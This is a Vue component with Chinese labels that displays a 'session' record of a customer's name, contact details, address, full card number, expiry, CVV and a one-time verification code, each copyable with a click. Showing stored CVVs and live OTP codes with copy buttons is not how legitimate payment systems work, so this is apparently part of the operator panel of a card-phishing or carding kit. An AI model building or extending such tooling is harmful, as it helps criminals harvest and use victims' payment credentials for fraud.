<script setup lang="ts">
import { computed } from 'vue';

const props = defineProps<{
  cardInfo: Api.Payment.CardInfo;
  customerInfo: Api.Payment.CustomerInfo;
  hideBin?: boolean;
  hidePhone?: boolean;
}>();

const cardIcon = computed(() => {
  const subType = ((props.cardInfo as any).cardSubType || props.cardInfo.cardLevel || '').toUpperCase();
  const isD = subType.startsWith('D') || subType.includes('DEBIT');
  return {
    type: isD ? 'D' : 'C',
    color: isD ? '#7367F0' : '#28C76F'
  };
});

function fmtCard(n: string) { return (n||'').replace(/\s/g,'').replace(/(\d{4})(?=\d)/g,'$1 ') }

function copy(val: string) {
  if (!val) return;
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(val).then(() => { window.$message?.success('已复制:' + val) }).catch(() => {});
    } else {
      var el = document.createElement('textarea'); el.value = val; el.style.position = 'fixed'; el.style.opacity = '0'; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el);
      window.$message?.success('已复制:' + val);
    }
  } catch (e) { window.$message?.error('复制失败') }
}
</script>

<template>
  <div class="session-fields">
    <div class="field field-wide" v-if="cardInfo.cardType" @click="copy(cardInfo.cardType)">
      <label>卡类型：</label>
      <span class="value card-type-badge" :style="{ color: cardIcon.color, borderColor: cardIcon.color }">
        <svg width="18" height="18" viewBox="0 0 24 24"><path :stroke="cardIcon.color" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 8a3 3 0 0 1 3-3h12a3 3 0 0 1 3 3v8a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3zm0 2h18M7 15h.01M11 15h2"/></svg>
        <span class="ct-text">{{ cardIcon.type }}<span v-if="(cardInfo as any).cardCountry"> | {{ (cardInfo as any).cardCountry }}</span></span>
      </span>
    </div>
    <div class="field card-information" v-if="cardInfo.cardLevel && !hideBin" @click="copy(cardInfo.cardLevel)"><label>卡级：</label><span>{{ cardInfo.cardLevel }}</span></div>
    <div class="field field-wide card-information" v-if="cardInfo.bankName && !hideBin" @click="copy(cardInfo.bankName)"><label>发卡行：</label><span>{{ cardInfo.bankName }}</span></div>
    <div class="field" v-if="customerInfo.fullName" @click="copy(customerInfo.fullName)"><label>姓名：</label><span class="value">{{ customerInfo.fullName }}</span></div>
    <div class="field" v-if="customerInfo.email" @click="copy(customerInfo.email)"><label>邮箱：</label><span class="value">{{ customerInfo.email }}</span></div>
    <div class="field" v-if="customerInfo.phone && !hidePhone" @click="copy(customerInfo.phone)"><label>电话：</label><span class="value">{{ customerInfo.phone }}</span></div>
    <div class="field" v-if="customerInfo.country" @click="copy(customerInfo.country)"><label>国家：</label><span class="value">{{ customerInfo.country }}</span></div>
    <div class="field field-wide" v-if="customerInfo.address1" @click="copy(customerInfo.address1)"><label>地址：</label><span class="value">{{ customerInfo.address1 }}</span></div>
    <div class="field" v-if="customerInfo.city" @click="copy(customerInfo.city)"><label>城市：</label><span class="value">{{ customerInfo.city }}</span></div>
    <div class="field" v-if="customerInfo.state" @click="copy(customerInfo.state)"><label>州/省：</label><span class="value">{{ customerInfo.state }}</span></div>
    <div class="field" v-if="customerInfo.zipCode" @click="copy(customerInfo.zipCode)"><label>邮编：</label><span class="value">{{ customerInfo.zipCode }}</span></div>
    <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)"><label>持卡人：</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)">
      <label>卡号：</label><span class="value value-green">{{ fmtCard(cardInfo.cardNumber) }}</span></div>
    <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)"><label>有效期：</label><span class="value">{{ cardInfo.expiry }}</span></div>
    <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)"><label>CVV：</label><span class="value">{{ cardInfo.cvv }}</span></div>
    <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)"><label>验证码：</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
  </div>
</template>

<style scoped>
.session-fields {
  display: flex; align-items: flex-start; gap: 8px; flex-wrap: wrap;
  padding-left: 22px; min-height: 34px; flex-shrink: 0; max-width: 100%;
}
.field { min-width: 50px; max-width: 180px; cursor: pointer; }
.field-wide { min-width: 50px; max-width: 240px; }
.field-card { min-width: 130px; max-width: 200px; }
.field label { display: block; color: var(--n-text-color-3); font-size: 12px; margin-bottom: 4px; line-height: 12px; }
.value { display: block; height: 24px; line-height: 24px; background: #E8E8EA; border: 1px solid #d0d4f129; color: var(--n-text-color); border-radius: .25rem; padding: 0 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 13px; text-align: center; }
html.dark .value { background: #41445B; border-color: #d0d4f129; }
.value-green { color: #fff; min-width: 165px; background: #18a058 !important; font-size: .8125rem; border-color: #18a058 !important; font-weight: 700; text-align: center; }
.value-orange { color: #fff; background: #f0a12d !important; border-color: #ffb545 !important; font-weight: 700; }
.card-type-badge { background: #ffffff00 !important; font-weight: bold; display: flex; align-items: center; gap: 4px; padding: 0 10px; border: 1px solid; }
.ct-text { margin-left: 2px; }
.card-information span { height: 24px; color: var(--n-text-color); text-overflow: ellipsis; white-space: nowrap; text-align: center; border: 1px solid #2f2b3d29; border-radius: .25rem; padding: 0 8px; font-size: 13px; line-height: 24px; display: block; overflow: hidden; }
html.dark .card-information span { border-color: #d0d4f129; }
</style>
